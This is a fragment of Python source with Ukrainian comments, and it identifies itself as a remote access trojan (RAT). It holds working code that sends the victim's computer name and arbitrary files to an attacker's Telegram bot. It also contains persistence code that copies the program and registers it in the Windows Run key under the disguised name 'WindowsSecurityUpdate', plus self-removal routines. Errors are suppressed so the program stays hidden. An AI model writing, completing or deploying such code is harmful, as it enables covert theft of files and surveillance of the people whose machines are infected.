# ---------- ФУНКЦІЇ ТЕЛЕГРАМ ----------
def send_msg(text):
    try:
        pc_name = os.getenv('COMPUTERNAME', 'Unknown')
        full_text = f"[{pc_name}] {text}"
        urllib.request.urlopen(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            data=urllib.parse.urlencode({'chat_id': CHAT_ID, 'text': full_text[:4000]}).encode(), timeout=5)
    except:
        pass

def send_file(path):
    try:
        with open(path, 'rb') as f:
            boundary = '----boundary' + str(time.time()).replace('.', '')
            body = (f'--{boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
                    f'--{boundary}\r\nContent-Disposition: form-data; name="document"; filename="{os.path.basename(path)}"\r\n'
                    'Content-Type: application/octet-stream\r\n\r\n').encode() + f.read() + f'\r\n--{boundary}--\r\n'.encode()
            req = urllib.request.Request(f"https://api.telegram.org/bot{TOKEN}/sendDocument", data=body, method='POST')
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            urllib.request.urlopen(req, timeout=10)
    except:
        pass

# ---------- ПЕРСИСТЕНЦІЯ ----------
def install_copy():
    """Копіює себе в INSTALL_DIR, якщо це не копія"""
    if sys.executable.lower() != INSTALL_PATH.lower() and not sys.executable.lower().endswith('python.exe'):
        try:
            shutil.copy2(sys.executable, INSTALL_PATH)
            # Додаємо в автозапуск
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, INSTALL_PATH)
            winreg.CloseKey(key)
            return True
        except:
            return False
    return False

def is_installed_copy():
    """Перевіряє, чи запущено з прихованої папки"""
    return os.path.abspath(sys.executable) == os.path.abspath(INSTALL_PATH)

# ---------- ПОВНЕ ВИДАЛЕННЯ (UNINSTALL) ----------
def uninstall():
    """Видаляє всі сліди RAT: автозапуск, копію, оригінал (якщо можливо)"""
    try:
        # Видаляємо з реєстру
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WindowsSecurityUpdate")
        winreg.CloseKey(key)
    except:
        pass
    # Видаляємо копію з INSTALL_DIR
    if os.path.exists(INSTALL_PATH):
        try:
            os.remove(INSTALL_PATH)
        except:
            pass
    # Видаляємо оригінальний файл (якщо це не копія)
    if not is_installed_copy():
        try:
            os.remove(sys.executable)
        except:
            pass
    send_msg("❌ Пристрій відключено. RAT видалено.")
    # Завершуємо процес
    sys.exit(0)

